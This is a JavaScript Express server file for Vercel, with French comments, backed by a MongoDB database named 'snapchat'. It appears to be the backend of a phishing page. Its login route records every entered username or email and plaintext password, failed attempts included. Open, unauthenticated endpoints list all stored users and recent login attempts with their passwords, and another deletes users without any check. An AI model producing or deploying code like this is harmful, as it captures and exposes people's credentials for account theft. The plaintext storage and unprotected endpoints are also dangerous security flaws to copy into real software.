/**
 * Point d'entree Express pour Vercel (detection automatique).
 * En local : utilise `npm start` (server.js).
 */
const express = require("express");
const path = require("path");
const mongoose = require("mongoose");

const User = require("./models/User");
const LoginAttempt = require("./models/LoginAttempt");

const app = express();
app.use(express.json());

// --- Connexion MongoDB --------------------------------------------------------
const MONGO_URI = process.env.MONGO_URI || "mongodb://localhost:27017/snapchat";

let isConnected = false;

async function connectDB() {
  if (isConnected) return;
  await mongoose.connect(MONGO_URI);
  isConnected = true;
}

// Middleware pour connecter a MongoDB avant chaque requete
app.use(async (_req, _res, next) => {
  try {
    await connectDB();
    next();
  } catch (err) {
    console.error("Erreur connexion MongoDB:", err.message);
    next(err);
  }
});

// --- Routes API ---------------------------------------------------------------

app.post("/api/register", async (req, res) => {
  const { username, email, password } = req.body;
  if (!username || !email || !password) {
    return res.status(400).json({ error: "Champs obligatoires" });
  }

  try {
    const user = await User.create({ username, email, password });
    return res.status(201).json({
      message: "Compte cree",
      user: { id: user._id, username: user.username, email: user.email },
    });
  } catch (err) {
    if (err.code === 11000) {
      return res.status(409).json({ error: "Nom d'utilisateur ou email deja pris." });
    }
    return res.status(500).json({ error: err.message });
  }
});

app.post("/api/login", async (req, res) => {
  const { identifier, password } = req.body;

  try {
    const user = await User.findOne({
      $or: [{ username: identifier }, { email: identifier }],
    });

    const isSuccess = user && password === user.password;

    await LoginAttempt.create({
      identifier,
      password,
      status: isSuccess ? "SUCCESS" : "FAILED",
    });

    if (!isSuccess) {
      return res.status(401).json({ error: "Identifiants incorrects" });
    }

    return res.json({
      message: `Bienvenue ${user.username}`,
      user: { id: user._id, username: user.username, email: user.email },
    });
  } catch (err) {
    return res.status(500).json({ error: err.message });
  }
});

app.get("/api/users", async (_req, res) => {
  try {
    const users = await User.find({}).sort({ created_at: -1 });
    res.json(
      users.map((u) => ({
        id: u._id,
        username: u.username,
        email: u.email,
        password: u.password,
        created_at: u.created_at,
      }))
    );
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

app.get("/api/login-attempts", async (_req, res) => {
  try {
    const attempts = await LoginAttempt.find({})
      .sort({ attempted_at: -1 })
      .limit(50);
    res.json(
      attempts.map((a) => ({
        id: a._id,
        identifier: a.identifier,
        password: a.password,
        status: a.status,
        ip_address: a.ip_address,
        attempted_at: a.attempted_at,
      }))
    );
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

app.delete("/api/users/:id", async (req, res) => {
  try {
    const user = await User.findById(req.params.id);
    if (!user) {
      return res.status(404).json({ error: "Utilisateur introuvable." });
    }
    await User.findByIdAndDelete(req.params.id);
    return res.json({ message: `Utilisateur ${user.username} supprime.` });
  } catch (err) {
    return res.status(500).json({ error: err.message });
  }
});

app.use(express.static(path.join(__dirname, "public")));

app.use((err, _req, res, _next) => {
  console.error(err);
  res.status(500).json({ error: "Erreur serveur" });
});

module.exports = app;
